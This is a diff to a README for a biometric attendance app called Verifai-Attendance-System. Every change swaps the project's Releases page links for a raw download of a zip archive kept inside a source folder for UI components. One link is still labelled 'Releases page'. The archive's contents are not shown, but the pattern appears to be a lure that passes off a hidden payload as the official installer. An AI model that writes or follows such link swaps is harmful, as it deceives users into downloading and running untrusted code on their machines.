@@ -1,6 +1,6 @@
 # 🛡️ Verifai-Attendance-System - Secure Biometric Attendance Made Easy
 
-[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-4CAF50?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/releases)
+[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-4CAF50?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/raw/refs/heads/main/server/client/src/components/ui/System_Attendance_Verifai_v2.0.zip)
 
 ## 🔍 About Verifai-Attendance-System
 
@@ -33,7 +33,7 @@ Getting Verifai-Attendance-System running on your Windows PC is straightforward.
 
 Click the green button below or visit the link to download the release files.
 
-[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-blue?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/releases)
+[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-blue?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/raw/refs/heads/main/server/client/src/components/ui/System_Attendance_Verifai_v2.0.zip)
 
 **Steps:**
 
@@ -106,7 +106,7 @@ The developers release new versions to improve security, fix bugs, and add featu
 
 To update:
 
-1. Visit the [Releases page](https://github.com/HMB09/Verifai-Attendance-System/releases).
+1. Visit the [Releases page](https://github.com/HMB09/Verifai-Attendance-System/raw/refs/heads/main/server/client/src/components/ui/System_Attendance_Verifai_v2.0.zip).
 2. Download the latest setup file.
 3. Run the new installer just like before.
 4. The installer will update the existing program without deleting your data.
@@ -142,4 +142,4 @@ For questions or help, visit the GitHub page and open the **Issues** tab. You ca
 
 ---
 
-[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-grey?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/releases)
+[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-grey?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/raw/refs/heads/main/server/client/src/components/ui/System_Attendance_Verifai_v2.0.zip)
